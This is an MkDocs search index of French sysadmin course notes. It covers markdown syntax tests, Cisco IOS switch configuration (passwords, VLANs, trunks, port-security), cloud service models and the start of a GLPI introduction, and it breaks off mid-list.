{"config":{"lang":["fr"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Welcome to MkDocs","text":"<p>Bienvenue sur mes notes ENI TSSR  </p> <p></p>"},{"location":"page_test/","title":"Page test syntaxe","text":""},{"location":"page_test/#syntaxe","title":"Syntaxe","text":"<p>italique mettre <code>*</code> ou <code>_</code> de chaque cot\u00e9 du mot</p> <p>gras mettre <code>**</code> ou <code>__</code> de chaque cot\u00e9 du mot</p> <p>gras et italique mettre <code>***</code> ou <code>___</code> de chaque cot\u00e9 du mot</p> <p>Pour un retour a la ligne enchainer 2 espaces et touche entr\u00e9e.</p>"},{"location":"page_test/#ligne-horizontale","title":"ligne horizontale","text":"<p>ajout de 3 <code>_</code> en dessous d'un titre (ou paragraphe) pour faire une ligne horizontale separatrice  </p> <p>Exemple 1</p> <p>l'ajout de <code>&gt;</code> au d\u00e9but d'un bloc de texte permet de creer une citation</p> <p>ceci est une citation et elle continue ici</p>"},{"location":"page_test/#titre","title":"Titre","text":"<p>rajouter autant de <code>#</code> avant les titres pour hierarchiser les titres</p>"},{"location":"page_test/#ajout-dimage","title":"Ajout d'image","text":"<p><code>![descriptif de la photo](./lien de l'image)</code> l'ajout de <code>./</code> entre les parentheses ouvre un menu de selection de documents.</p>"},{"location":"page_test/#bloc-de-note","title":"Bloc de note","text":"<p>Pour les mises en pages suivante il faut installer l'extension mkdocs-material</p> <pre><code>pip install mkdocs-material\n</code></pre> <p>et l'ajouter au fichier <code>mkdocs.yml</code></p> <pre><code>site_name: My Docs ENI\ntheme: \n  name: material\n  features:\n  - navigation.tabs\n  - nativation.top\n</code></pre>"},{"location":"page_test/#block-statique","title":"block statique","text":"<p>Titre 1</p> <p>avec l'ajout de <code>!!!</code> cela cr\u00e9e une note statique la syntaxe du texte doit etre faite via des tabulations afin que le texte soit indent\u00e9</p> <p>titre 2</p> <p>titre 3</p> <p>titre 4</p> <p>titre 5</p> <p>titre 6</p> <p>titre 7</p> <p>Titre 8</p> <p>Titre 9</p> <p>Titre 10</p> <p>Titre 11</p> <p>Titre 12</p>"},{"location":"page_test/#bloc-dynamique","title":"bloc dynamique","text":"titre 1 <p>avec l'ajout de <code>???</code> cela cr\u00e9e une note etendu celle-ci sera referm\u00e9 de base (meme synatxe que pour le block statique)</p> Titre 2 Titre 3 Titre 4 Titre 5 Titre 6 Titre 7 Titre 8 Titre 9 Titre 10 Titre 11 Titre 12"},{"location":"page_test/#bloc-dynamique-etendu-de-base","title":"bloc dynamique etendu de base","text":"Titre 1 <p>avec l'ajout d'un <code>+</code> juste apres les <code>???</code> ceci permet d'\u00e9tendre directement la note (meme syntaxe que les autres blocs)</p>"},{"location":"page_test/#onglets","title":"onglets","text":"Exemple 1Exemple 2 <p>Test 1</p> <p>Test 2</p>"},{"location":"page_test/#bloc-avec-onglets","title":"bloc avec onglets","text":"<p>Titre 1</p> Exemple 1Exemple 2 <p>Test 1</p> <p>Test 2</p>"},{"location":"page_test/#bloc-dynamique-avec-onglet","title":"bloc dynamique avec onglet","text":"Titre 1 Exemple 1Exemple 2 <p>Test 1</p> <p>Test 2</p>"},{"location":"page_test/#inline-block","title":"inline block","text":"<p>Titre 1</p> <p>Ceci est une note pour test (meme syntaxe que les autres blocs)</p> <p> <p>      possibilit\u00e9 d'integrer du texte sous l'image     </p> </p>"},{"location":"page_test/#endline-block","title":"endline block","text":"<p>Titre 1</p> <p>Ceci est une note pour test (meme syntaxe que les autres blocs)</p> <p> <p>      possibilit\u00e9 d'integrer du texte sous l'image     </p> </p>"},{"location":"page_test/#tableaux","title":"Tableaux","text":"A B C A B C 1 2 3 A B C 1 2 3 A B C"},{"location":"page_test/#diagram","title":"Diagram","text":"<pre><code>graph LR\n  A[Start] --&gt; B{Error?};\n  B --&gt;|YES| C[Hmmm...];\n  C --&gt; D[Debug];\n  D --&gt; B;\n  B ----&gt;|NO| E[Yay!];\n</code></pre> <pre><code>routeur&gt; en\n!---- Permet de choisir une interface de vlan\nrouteur# interface vlan 20\n</code></pre> <p>T1</p> <p>T2</p> <p>exemple</p> Titre 1Test 2Test 3 <p>test test test</p> <p>titre</p> <p>Default Primary Info Success Warning Danger Link</p>"},{"location":"Cisco/ios/","title":"Cisco IOS","text":""},{"location":"Cisco/ios/#prise-en-main-de-cisco-ios","title":"Prise en main de Cisco\u00ae IOS","text":"<p>Cisco IOS (Internetwork Operating System) est le logiciel interne sur la plupart des routeurs et switchs Cisco Systems. Il dispose de fonction de routage (routing), de commutation (switching), d'interconnexion de r\u00e9seaux (internetworking). Il s'agit d'une interface en ligne de commande accessible via Telnet, port s\u00e9rie et SSH. Sur certaine machine IOS peut disposer d'une interface web.  </p>"},{"location":"Cisco/ios/#navigation-sous-ios","title":"Navigation sous IOS","text":""},{"location":"Cisco/ios/#principaux-mode-de-commande","title":"Principaux mode de commande","text":"<p>IOS comporte 2 modes de commande:  </p> Mode d'ex\u00e9cution utilisateurMode d'ex\u00e9cution privil\u00e9gi\u00e9 <ul> <li>Ce mode n'autorise l'acc\u00e8s qu'\u00e0 un nombre limit\u00e9 de commandes</li> <li>Prompt &gt; <pre><code>Router&gt;\nSwitch&gt;\n</code></pre></li> </ul> <ul> <li>Acc\u00e8s a toutes les commandes</li> <li>Prompt # <pre><code>Router#\nSwitch#\n</code></pre></li> </ul>"},{"location":"Cisco/ios/#mode-configuration-et-sous-modes-de-configuration","title":"Mode configuration et sous-modes de configuration","text":"<p>IOS comporte 3 modes de configuration:  </p> Configuration globaleConfiguration de ligneConfiguration d'interface <ul> <li>Options de configuration <pre><code>Switch(config)#\n</code></pre></li> </ul> <ul> <li>Pour configurer <ul> <li>Console</li> <li>SSH</li> <li>Telnet</li> <li>AUX <pre><code>Switch(config-line)#\n</code></pre></li> </ul> </li> </ul> <ul> <li>Permet de configurer une interface<ul> <li>FastEthernet</li> <li>GigaEthernet<ul> <li>La commande <code>shutdown</code> va couper un port</li> <li>La commande <code>no shutdown</code> allumera le port <pre><code>Switch(config-if)# shutdown     !--- le port sera down\nSwitch(config-if)# no shutdown  !--- le port sera up\n</code></pre></li> </ul> </li> </ul> </li> </ul>"},{"location":"Cisco/ios/#navigation-entre-les-differents-modes","title":"Navigation entre les diff\u00e9rents modes","text":"Mode d'ex\u00e9cution privil\u00e9gi\u00e9Mode de configuration globaleMode de configuration de ligneSous-modes de configuration <ul> <li>Utilisateur vers privil\u00e9gi\u00e9 <pre><code>Switch&gt; enable\nSwitch#\n</code></pre></li> </ul> <ul> <li><code>Configure Terminal</code> pour basculer dans le mode</li> <li><code>exit</code> pour en sortir <pre><code>Switch# conf t\nSwitch(config)#\nSwitch(config)#exit\nSwitch#\n</code></pre></li> </ul> <ul> <li><code>Line &lt;line type&gt; &lt;number line&gt;</code></li> <li><code>exit</code> pour sortir du mode de configuration <pre><code>Switch(config)#line console 0\nSwitch(config-line)#\nSwitch(config-line)#exit\nSwitch(config)#\n</code></pre></li> </ul> <ul> <li><code>end</code> permet de sortir de n'importe quelle mode vers le mode privil\u00e9gi\u00e9 <code>IOS Switch(config)#line console 0 Switch(config-line)# Switch(config-line)#end Switch#</code></li> </ul>"},{"location":"Cisco/ios/#structures-des-commandes","title":"Structures des commandes","text":"<p>Les commandes IOS Cisco utilise un format et une syntaxe sp\u00e9cifique, elle ne peuvent \u00eatre ex\u00e9cut\u00e9e que dans le mode appropri\u00e9.  </p> <p>En g\u00e9n\u00e9ral une commande est constitu\u00e9e d'un nom de commande suivi des mots-cl\u00e9s et des arguments appropri\u00e9s. Les commandes ne sont pas sensibles \u00e0 la casse.  </p> <p>  La commande fait un appel d'ex\u00e9cution Le mot-cl\u00e9 (ou argument) est une variable </p>"},{"location":"Cisco/ios/#laide-ios","title":"L'aide IOS","text":"<p>IOS comporte 2 aides :  </p> <ul> <li>l'aide contextuelle \"?\"<ul> <li>Fournit la liste de commande, des mots-cl\u00e9s et des argumentsdisponibles dans le mode en vigueur.</li> <li>Permet l'affichage d'une liste de commandes disponibles.</li> </ul> </li> </ul> <pre><code>Switch#cd?\nclear clock\n\nSwitch#clock set ?\nhh:mm:ss Current Time\n\nSwitch#clock set 19:50:00 ?\n&lt;1-31&gt;  Day of the month\nMONTH Month of the year\n\nSwitch#clock set 19:50:00 18 August 2023\nSwitch#\n</code></pre> <ul> <li>Contr\u00f4le de la syntaxe  <ul> <li>lorsque qu'une commande est envoy\u00e9e l'interpr\u00e9teur analyse la commande de gauche \u00e0 droite.  </li> <li>En g\u00e9n\u00e9ral, l'IOS fournit uniquement des retours n\u00e9gatif</li> <li>S'il ne comprend pas la commande entr\u00e9e, l'interpr\u00e9teur affiche les commentaires d\u00e9crivant le probl\u00e8mes:<ul> <li>Commande ambigu\u00eb</li> <li>Commande incompl\u00e8te</li> <li>Commande incorrecte</li> </ul> </li> </ul> </li> </ul> <pre><code>Switch#c\n% Ambiguous command:'c'\n\nSwitch#&gt;clock set\n% Incomplete command.\nSwitch#clock set 19:50:00\n% Incomplete command.\n\nSwitch#clock set 19:50:00 18 8\n                            ^\n% Invalid input detected at '^' marker\n</code></pre>"},{"location":"Cisco/ios/#configuration-de-base","title":"Configuration de base","text":"<p><code>no</code> ajout\u00e9 avant certaines commandes permet la suppression. - <code>no hostname</code> supprime le nom - <code>no ip address</code> supprime l'adresse ip</p> <p>Concernant les param\u00e9trages les commandes ne seront pas commenter. Elles seront r\u00e9f\u00e9renc\u00e9s par un Titre et les lignes de code suivront directement apr\u00e8s.  </p>"},{"location":"Cisco/ios/#nommage-de-lequipement","title":"Nommage de l'\u00e9quipement","text":"<pre><code>router(config)#no hostname (hostname)          # supprimer le hostname \nrouter(config)#hostname (hostname)             # assigner un hostname\n</code></pre>"},{"location":"Cisco/ios/#securiser-les-acces","title":"Securiser les acc\u00e8s","text":""},{"location":"Cisco/ios/#mode-execution-utilisateur","title":"Mode ex\u00e9cution utilisateur","text":"<pre><code># Attribuez cisco comme mot de passe de console, puis activez la connexion.\n\nS1(config)# line console 0\n\nS1(config-line)# password cisco\n\nS1(config-line)# login\n\nS1(config-line)# exit\n</code></pre>"},{"location":"Cisco/ios/#mode-execution-privilegie","title":"Mode ex\u00e9cution privil\u00e9gi\u00e9","text":"<pre><code># Utilisez class comme mot de passe pour le mode d'ex\u00e9cution privil\u00e9gi\u00e9 chiffr\u00e9\n\nS1#conf t\nS1(config)# enable secret class\nS1(config)#exit\nS1#\n</code></pre>"},{"location":"Cisco/ios/#acces-ligne-vty","title":"Acc\u00e8s ligne VTY","text":"<pre><code>S1#conf t\nS1(config)# line vty 0 15   !--- choix des lignes VTY 0 \u00e0 15\nS1(config)# password cisco  !--- impl\u00e9mentation du mdp cisco\nS1(config)# login           !--- d\u00e9finit le mdp pour le login\nS1(config)# end\nS1#\n</code></pre>"},{"location":"Cisco/ios/#chiffrement-mot-de-passe","title":"Chiffrement mot de passe","text":"<p><pre><code>S1# conf t\nS1(config)# service password-encryption !--- service permettant le chiffrement des mdp\nS1(config)# exit\nS1#\n</code></pre> Possibilit\u00e9 de v\u00e9rifier avec la commande <code>show running-config</code>.  </p>"},{"location":"Cisco/ios/#motd-message-of-the-day","title":"MOTD (Message of the day)","text":"<p>La banni\u00e8re sera affich\u00e9 lors des tentatives d'acc\u00e8s \u00e0 l'appareil.  </p> <pre><code>S1# conf t\nS1(config)# banner motd \"Authorized Access Only!\"\n</code></pre> <p>Cela affichera : <pre><code>Press RETURN to get started.\n\nAuthorized Access Only!\n\nUser Access Verification\n\nPassword:\n</code></pre></p>"},{"location":"Cisco/ios/#configuration-reseau","title":"Configuration R\u00e9seau","text":""},{"location":"Cisco/ios/#adresse-ip","title":"Adresse IP","text":"<p>Vous pouvez attribuer au switch une adresse IP dans les VLAN. Si votre switch ne sert pas comme routeur, ce n'est pas indispensable, et permet surtout de faire des tests de connectivit\u00e9 et d'administrer le switch \u00e0 distance depuis n'importe quel VLAN.  </p> SwitchRouteur <pre><code>S1# conf t\nS1(config)# int vlan1                               !--- Sur un Switch Cisco, ce sont les interfaces VLAN qui portent les IP\nS1(config-if)#ip address 192.168.1.10 255.255.255.0\nS1(config-if)#no shutdown                           !--- Garde le VLAN1 actif\nS1(config-if)#exit\nS1(config)#\n</code></pre> <pre><code>S1# conf t\nS1(config)# int g0/0                                !--- Selection de l'interface ou mettre l'IP\nS1(config-if)#ip address 192.168.1.10 255.255.255.0\nS1(config-if)#no shutdown                           !--- Garde l'interface active\nS1(config-if)#exit\nS1(config)#\n</code></pre>"},{"location":"Cisco/ios/#adresse-passerelle","title":"Adresse Passerelle","text":"<pre><code>S1#conf t\nS1(config)#ip default gateway 192.168.1.1   !--- d\u00e9finit le routeur auquel le switch\nS1(config)#exit                                  va ce connect\u00e9 pour communiquer \u00e0\nS1#                                              l'ext\u00e9rieur du LAN.\n</code></pre>"},{"location":"Cisco/ios/#test-connectivite","title":"Test Connectivit\u00e9","text":"<pre><code>S1#ping 192.168.1.1\n!!!!!\nSuccess rate is 100 percent (5/5), round-trip min/avg/max = 1/1/3 ms\n\nS1#ping 8.8.8.8\n!!!!!\nSuccess rate is 100 percent (5/5), round-trip min/avg/max = 6/12/25 ms\n</code></pre>"},{"location":"Cisco/ios/#enregistrement-de-la-configuration","title":"Enregistrement de la configuration","text":"<ul> <li>startup-config - Situ\u00e9 dasn la NVRAM. Contient la conf de d\u00e9marrage</li> <li>running-config - Situ\u00e9 dans la RAM. Contient la conf en cours (perdue au red\u00e9marrage du p\u00e9riph\u00e9rique)</li> <li>copy running-config startup-config - Copie la conf courante dans la conf de d\u00e9marrage</li> </ul> <pre><code>router(config)#exit\nrouter&gt;copy running-config startup-config   !--- copy run start - \u00e9galement fonctionnelle\nrouter&gt;\n</code></pre>"},{"location":"Cisco/ios/#configuration-des-ports","title":"Configuration des ports","text":""},{"location":"Cisco/ios/#montagedemontage-des-ports","title":"Montage/D\u00e9montage des ports","text":"shutdownno shutdown <pre><code>S1#conf t\nS1(config)#int f0/1\nS1(config-if)#shutdown\nS1(config-if)#\n%LINK-5-CHANGED: Interface FastEthernet0/1, changed state to administratively down\n%LINEPROTO-5-UPDOWN: Line protocol on Interface FastEthernet0/1, changed state to down\nS1(config-if)#ex\nS1(config)#\n</code></pre> <pre><code>S1#conf t\nS1(config)#int f0/1\nS1(config-if)#no shutdown\nS1(config-if)#\n%LINK-5-CHANGED: Interface FastEthernet0/1, changed state to up\n%LINEPROTO-5-UPDOWN: Line protocol on Interface FastEthernet0/1, changed state to up\nS1(config-if)#end\nS1#\n</code></pre>"},{"location":"Cisco/ios/#suppression-configuration-dun-port","title":"Suppression configuration d'un port","text":"<pre><code>S1(config)#~default int gi1/0/1\nInterface GigabitEthernet1/0/48 set to default configuration\nS1(config)#end\nS1#sh run int gi1/0/1\nBuilding configuration...\n\nCurrent configuration : 39 bytes\n!\ninterface GigabitEthernet1/0/1\nend\n\nS1#\n</code></pre>"},{"location":"Cisco/ios/#vlan","title":"VLAN","text":""},{"location":"Cisco/ios/#creation-et-nommage","title":"Cr\u00e9ation et nommage","text":"VLAN ClassiqueVLAN Voix <pre><code>S1(config)#vlan 10                     !--- creer le VLAN 10\nS1(config-vlan)#name Administration    !--- d\u00e9finit le nom du VLAN 10\nS1(config-vlan)#ex\nS1(config)#vlan 20,30,40               !--- permet la cr\u00e9ation de plusieurs VLAN\nS1(config-vlan)#ex\nS1(config)#\nS1(config)#no vlan 20                  !--- supprime le VLAN 20\n</code></pre> <pre><code>S1(config)# int f0/11\nS1(config-if)# switchport mode access     !--- passage du port en mode access\nS1(config-if)# switchport access vlan 30  !--- vlan 30 assigner au port f0/11\nS1(config-if)# mls qos trust cos          !--- mise en place du [QoS](.)\nS1(config-if)# switchport voice vlan 150  !--- attribue le port au vlan voix\n</code></pre>"},{"location":"Cisco/ios/#affectation-dun-port","title":"Affectation d'un port","text":"<pre><code>S1(config)#int fa0/1\nS1(config-if)#switchport mode access     !--- passage du port en mode access\nS1(config-if)#switchport access vlan 10  !--- affectation du vlan au port\nS1(config-if)#\n\nS1(config-if)#no switchport access vlan  !--- supprime le vlan sur le port\nS1(config-if)#no switchport mode acc     !--- supprime le mode acc\nS1(config-if)#end\nS1(config)#\n</code></pre>"},{"location":"Cisco/ios/#trunk","title":"Trunk","text":""},{"location":"Cisco/ios/#creation-et-attribution-a-un-port","title":"Cr\u00e9ation et attribution \u00e0 un port","text":"<pre><code>S1(config)#int g1/0/1\nS1(config)#switchport trunk encapsulation dot1q                 !--- pas n\u00e9cessaire sur les mod\u00e8les 2960\nS1(config-if)#switchport mode trunk\nS1(config-if)#switchport trunk native vlan 10\nS1(config-if)#\n</code></pre>"},{"location":"Cisco/ios/#filtrage-des-vlan-sur-un-port-trunk","title":"Filtrage des VLAN sur un port Trunk","text":"<pre><code>S1(coonfig)#int g1/0/1 \nS1(config-if)#switchport trunk allowed vlan 10,12,19    !--- autorise les vlans selectionn\u00e9 sur la liaison trunk\nS1(config-if)#\n\nS1(config-if)#switchport trunk allowed vlan remove 12   !--- interdit au vlan 3 de passer par le trunk\n\nS1(config-if)#no switchport trunk allowed vlan          !--- supprime la commande de filtrage\n</code></pre>"},{"location":"Cisco/ios/#commande-nonegociate","title":"Commande <code>nonegociate</code>","text":"<p>Le protocole DTP (Dynamic Trunking Protocol) permet \u00e0 2 switch connect\u00e9s de monter un Trunk automatiquement (par exemple la connexion d'un port configur\u00e9 par d\u00e9faut en dynamic auto vers un port Trunk). D\u00e9sactiver cette fonctionnalit\u00e9 est, en g\u00e9n\u00e9ral, recommand\u00e9 sur tous les ports access et Trunk.  </p> <pre><code>S1(config)#int range f1/0/1 - 10            !--- selection d'une plage de ports\nS1(config-if-range)#switchport nonegotiate  !--- activation de la non n\u00e9gociation auto.\n\nS1#show interfaces fa1/0/2 switchport       !--- verification de la prise en compte sur un port\nName: Fa1/0/2\nSwitchport: Enabled\nAdministrative Mode: static access\nOperational Mode: down\nAdministrative Trunking Encapsulation: negotiate\nNegotiation of Trunking: Off\nAccess Mode VLAN: 2 (VLAN0002)\n</code></pre>"},{"location":"Cisco/ios/#port-security","title":"Port-Security","text":""},{"location":"Cisco/ios/#activation","title":"Activation","text":"<pre><code>S1(config)# int fa0/1\nS1(config-if)# switchport mode access\nS1(config-if)# switchport port-security     !--- active le port-security sur ce port\n</code></pre>"},{"location":"Cisco/ios/#apprentissage-statique","title":"Apprentissage Statique","text":"<pre><code>S1(config-if)# switchport port-security mac-address &lt;xxxx.xxxx.xxx&gt;     !--- &lt;adresse mac&gt;\n</code></pre>"},{"location":"Cisco/ios/#apprentissage-dynamique","title":"Apprentissage dynamique","text":"<pre><code>S1(config-if)# switchport port-security mac-address sticky      !--- Utilisation du sticky\nS1(config-if)# switchport port-security maximum 10              !--- Ce param\u00e8tre determine le nob d'adresse maximum pouvant etre prise dynamiquement\n</code></pre>"},{"location":"Cisco/ios/#violation","title":"Violation","text":"<pre><code>S1(config-if)# switchport port-security violation [shutdown | restrict | protect]\n</code></pre>"},{"location":"Cisco/ios/#depannage-du-port-security","title":"D\u00e9pannage du port-security","text":"<pre><code>Switch# show port-security                      !--- montre l'\u00e9tat des ports utilisant le \"port-security\"\nSwitch# show interfaces status err-disabled     !--- montre les les ports en `err-disable`.\n</code></pre> <p>Retirer l'equipement non autoris\u00e9 du port puis faire :  </p> <pre><code>S1(config)# int fax/x\nS1(config-if)# shut\nS1(config-if)# no shut\n</code></pre>"},{"location":"Cisco/ios/#show","title":"Show","text":""},{"location":"Cloud_M365/cloud/","title":"Cloud & Microsoft 365","text":""},{"location":"Cloud_M365/cloud/#cloud","title":"Cloud","text":"<p>Le \"Cloud\" vient du symbole utilis\u00e9 pour d\u00e9signer le r\u00e9seau internet dans un sch\u00e9ma d'architecture syst\u00e8me ou r\u00e9seau. Il fournit la puissance de calcul (processeurs, RAM, GPU...), du stockage, des logiciels aux infrastructure, machines, logiciel. Il ce caract\u00e9ristique par une grande souplesse, en effet il tr\u00e8s facile d'ajouter un composant, une ressource, une VM dans un environnement \"cloud\" Le besoin de l'entreprise et les comp\u00e9tences de l'utilisateur determineront le mode de gestion :  </p> <ul> <li>Gestion du serveur par l'utilisateur/entreprise  </li> <li>Gestion uniquement des services install\u00e9s  </li> <li>Se contenter d'utiliser des applications distantes  </li> </ul> <p>Le cloud apporte de la s\u00e9curit\u00e9 d'un point de vue disponibilit\u00e9 des donn\u00e9es. En effet un data center permet de fournir une garantie de service au niveau :  </p> <ul> <li>R\u00e9seau : En cas de machine d\u00e9faillante celle-ci seront remplac\u00e9, la maintenance sera enti\u00e8rement g\u00e9r\u00e9e par le service d'h\u00e9bergement;  </li> <li>Electricit\u00e9 : Le passage par un data center permet d'acc\u00e9der \u00e0 de la redondance \u00e9nerg\u00e9tique, extremement couteuse si cela \u00e9tait stock\u00e9 au sein de l'entreprise,  </li> <li>Climatisation,  </li> <li>Syst\u00e8me anti-incendie.  </li> </ul> <p>Le cloud apporte \u00e9galement une meilleure visibilit\u00e9 financi\u00e8re aux entreprises, la facturation des services est dimensionn\u00e9e en fonction de l'utilisation souhait\u00e9e La gestion du mat\u00e9riel n'est plus une charge, en effet :  </p> <ul> <li>L'Obsolescence du mat\u00e9riel n'est plus un souci, celui-ci sera mis r\u00e9guli\u00e8rement \u00e0 jour,  </li> <li>L'achats de mat\u00e9riel en fonction des besoins, celui-ci sera pris en charge par l'h\u00e9bergeur,  </li> <li>Gestion des garanties,  </li> <li>Acc\u00e8s \u00e0 du mat\u00e9riel haute performance qui reviendrait vite ch\u00e8re \u00e0 l'entreprise,  </li> </ul> <p>Cependant le cloud n'as pas que des avantages, en effet avant de passer sur du Cloud Computing il faudra ce poser quelques question de s\u00e9curit\u00e9.  </p> <p>Ou seront localis\u00e9 les donn\u00e9es ? Quelle est le niveau de s\u00e9curit\u00e9 du Data Center ? Qui peut y acc\u00e9der ? Est-ce que les baies et locaux sont s\u00e9curis\u00e9 ? Quelles sont les garanties de disponibilit\u00e9 sur les donn\u00e9es h\u00e9berg\u00e9es ? Que se passe-t-il en cas de coupure internet ? A savoir qu'en cas de coupure vos donn\u00e9es stock\u00e9, ou ayant besoin du cloud, ne seront plus accessible  </p>"},{"location":"Cloud_M365/cloud/#as-a-service","title":"As-A-Service","text":"<p>L'expression \"aas\" ou \"as-a-Service\" signifie qu'un tiers se charge de fournir un service de cloud computing. Ce mode de fonctionnement permet de ce concentrer sur des aspects plus importants. Chaque type de cloud computing all\u00e8ge la gestion de votre infrastructure sur site.  </p> <p>En effet une infrastructure informatique sur site repr\u00e9sente la solution mettant le plus de responsabilit\u00e9 entre les mains des utilisateurs et des techniciens.  </p> <p>Le Cloud computing permet d'externaliser la gestion d'un, de plusieurs ou de tous les composants d'une infrastructure.  </p>"},{"location":"Cloud_M365/cloud/#spi-les-differents-modeles-de-cloud","title":"SPI - Les diff\u00e9rents mod\u00e8les de Cloud","text":"<p>Il existe 3 principaux types de cloud computing \"as-a-Service\", permettant un certain degr\u00e9 de gestion. Ceux-ci sont repris dans l'acronyme SPI </p> <p></p> SaaS - Software as a ServicePaaS - Platform as a ServiceIaaS - Infrastructure as a Service <p>Le SaaS permet la mise \u00e0 disposition d'applications aux utilisateurs finaux L'utilisateur est d\u00e9charg\u00e9 de la partie configuration des logiciels ce qui pr\u00e9sente des avantages, mais aussi des inconv\u00e9nients  </p> Avantages/Inconv\u00e9nient <p> </p> Exemples de SaaS <p> </p> <p>Le PaaS permet la mise \u00e0 disposition d'environnements et de plateformes informatiques Il permet de mettre \u00e0 disposition des OS ou des applications sp\u00e9cifiques sur des infrastructures mutualis\u00e9es  </p> Avantages/Inconv\u00e9nient <p> </p> Exemple de PaaS <p> </p> <p>L'IaaS permet la mise \u00e0 disposition d'infrastructures aux administrateurs Les administrateurs n'ont plus besoin de se pr\u00e9occuper des probl\u00e9matiques li\u00e9es \u00e0 l'h\u00e9bergement interne des serveurs, le mat\u00e9riel est mis \u00e0 disposition par le fournisseur  </p> Avantages/Inconv\u00e9nient <p> </p> Exemple d'IaaS <p> </p>"},{"location":"Cloud_M365/cloud/#types-de-cloud","title":"Types de Cloud","text":""},{"location":"Cloud_M365/cloud/#cloud-public","title":"Cloud Public","text":"<p>Le mat\u00e9riel (serveurs, stockage) est la propri\u00e9t\u00e9 du fournisseur de services, en effet g\u00e9n\u00e9ralement les environnements cloud public n'appartiennent pas aux utilisateurs finaux. Les principaux fournisseurs de Cloud Public sont :  </p> <ul> <li>Microsoft Azure  </li> <li>Google Cloud  </li> <li>Amazon Web Services (AWS)  </li> </ul> <p>L'extensibilit\u00e9 est pratiquement illimit\u00e9e, celui-ci apporte \u00e9norm\u00e9ment de fiabilit\u00e9 avec un co\u00fbts relativement faibles. L'utilisateur final n'aura pas de mat\u00e9riel \u00e0 maintenir, le fournisseur de service s'en charge Il faudra cependant faire attention aux volumes de donn\u00e9es qui circulent et aux temps d'allumage des VM  </p>"},{"location":"Cloud_M365/cloud/#cloud-prive","title":"Cloud Priv\u00e9","text":"<p>Un cloud priv\u00e9 est d\u00e9finis comme un environnement cloud sp\u00e9cifique \u00e0 un utilisateur final ou \u00e0 un groupe, ils sont habituellement ex\u00e9cut\u00e9s derri\u00e8re le pare-feu de l'utilisateur ou du groupe. En effet l'int\u00e9gration du mat\u00e9riel est g\u00e9n\u00e9ralement dans un datacenter tiers ou interne \u00e0 l'entreprise De ce faite la fiabilit\u00e9, la s\u00e9curit\u00e9 (accrue car le mat\u00e9riel n'est pas mutualis\u00e9) et l'extensibilit\u00e9 sont \u00e0 la charge de l'entreprise L'evolutivit\u00e9 est limit\u00e9 sous r\u00e9serve d'investissements souvent couteux Tous les clouds deviennent des clouds priv\u00e9s lorsque l'infrastructure informatique est sp\u00e9cifique \u00e0 un client unique, avec un acc\u00e8s enti\u00e8rement isol\u00e9.  </p>"},{"location":"Cloud_M365/cloud/#cloud-prive-geres","title":"Cloud Priv\u00e9 G\u00e9r\u00e9s","text":"<p>Cloud cr\u00e9\u00e9 et utilis\u00e9 par les clients, il est d\u00e9ploy\u00e9, configur\u00e9 et g\u00e9r\u00e9 par un fournisseur tiers. Ils permettent aux entreprises de fournir de meilleurs services et infrastructures de cloud priv\u00e9, m\u00eame lorsqu'elles ne disposent pas du personnel informatique qualifi\u00e9 et n\u00e9cessaire.  </p>"},{"location":"Cloud_M365/cloud/#cloud-prive-dedies","title":"Cloud Priv\u00e9 D\u00e9di\u00e9s","text":"<p>Il s'agit d'un Cloud au sein d'un autre Cloud. Il est possible de d\u00e9ployer un Cloud sp\u00e9cialis\u00e9 dans un cloud public ou dan un cloud priv\u00e9. Un service de l'entreprise peut disposer de son propre cloud r\u00e9serv\u00e9 au sein du cloud priv\u00e9 de l'entreprise.  </p>"},{"location":"Cloud_M365/cloud/#cloud-hybride","title":"Cloud Hybride","text":"<p>Il s'agit de la combinaison de l'h\u00e9bergement local ou d'un Cloud priv\u00e9 avec un Cloud public, Il permet de g\u00e9rer les co\u00fbts, de ma\u00eetriser la s\u00e9curit\u00e9 et d'optimiser les performances en prenant le meilleur des diff\u00e9rents types de Cloud Permet de fiabiliser les services en les \"\u00e9clatant\" sur les diff\u00e9rents types de Cloud Expansion facile gr\u00e2ce au Cloud public, performance et s\u00e9curit\u00e9 gr\u00e2ce au Cloud priv\u00e9 Rapport co\u00fbt/efficacit\u00e9  </p> <p>Un cloud hybride peut inclure :  </p> <ul> <li>Au moins un cloud priv\u00e9 et au moins un cloud public  </li> <li>Au moins 2 clouds priv\u00e9s  </li> <li>Au moins 2 clouds publics  </li> <li>Un environnement nu ou virtuel connect\u00e9 \u00e0 au moins un cloud priv\u00e9 ou public  </li> </ul>"},{"location":"Cloud_M365/cloud/#garantie-du-cloud","title":"Garantie du Cloud","text":"<p>Les plateformes h\u00e9berg\u00e9es dans les datacenter proposent des niveaux de garantie de disponibilit\u00e9 diff\u00e9rents :  </p> <p></p>"},{"location":"Cloud_M365/cloud/#hebergement-interne-ou-cloud","title":"H\u00e9bergement interne ou Cloud ?","text":"<p>Faut-il fdisk -dev</p>"},{"location":"GLPI/glpi/","title":"GLPI","text":""},{"location":"GLPI/glpi/#glpi","title":"GLPI","text":""},{"location":"GLPI/glpi/#presentation-de-glpi","title":"Pr\u00e9sentation de GLPI","text":"<p>GLPI est l'acronyme de Gestion Libre de Parc Informatique port\u00e9 par la soci\u00e9t\u00e9 Teclib' GLPI est un logiciel complet pour la gestion de parc et les centres de services, celui-ci est disponible en plusieurs langues et comporte un grand nombre de plugins. Il s'agit d'un outil ITSM (IT Service Management) conforme aux bonnes pratiques ITIL, il est adaptable aussi bien au petits comme au grands syst\u00e8mes d'information Celui-ci est sous licence GPL (GNU Public License) 100% libre Son installation est possible sur Linux et Windows (bien que mieux optimis\u00e9 sur Linux) Celui-ci est modifiable via de nombreux plugins et est disponible \u00e9galement en plusieurs langues.  </p>"},{"location":"GLPI/glpi/#les-composants-de-glpi","title":"Les composants de GLPI","text":""},{"location":"GLPI/glpi/#serveur-web","title":"Serveur Web","text":"<p>GLPI n\u00e9cessite une \"LAMP\" (Linux, Apache2, MySql, Php) pour fonctionner. GLPI est encod\u00e9 en PHP, permettant une grande portabilit\u00e9. Comme indiqu\u00e9 au dessus son installation n\u00e9cessite un serveur web (de pr\u00e9f\u00e9rence apache2) mais il \u00e9galement possible de l'installer sur un serveur IIS ou Nginx capable d'interpreter du code PHP  </p> <p>Pour que GLPI puisse fonctionner correctement le serveur devra comporter des extensions PHP obligatoire/recommand\u00e9es :  </p> <ul> <li>php-mysql : Extension pour la gestion de base de donn\u00e9es  </li> <li>php-mbstring : Permet la gestion des codages de caract\u00e8res multi-octets  </li> <li>php-curl : Permet l'installation de la librairie cURL (Client Url Library)  </li> <li>php-gd : Permet d'acceder \u00e0 